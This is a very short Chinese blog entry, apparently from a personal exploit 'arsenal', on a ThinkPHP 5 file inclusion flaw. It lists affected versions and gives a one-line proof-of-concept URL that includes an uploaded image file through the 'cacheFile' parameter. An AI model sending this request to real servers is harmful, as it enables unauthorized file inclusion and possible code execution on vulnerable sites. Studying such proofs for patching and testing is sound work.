---
title: 'Thinkphp5文件包含漏洞'
date: Sat, 03 Oct 2020 02:05:31 +0000
draft: false
tags: ['白阁-武器库']
---

### 影响范围

5.0.0 <= Thinkphp <= 5.0.18 5.1.0 <= ThinkPHP <= 5.1.10

### 漏洞POC

```
http://**********/index/index/index?cacheFile=1.jpg
```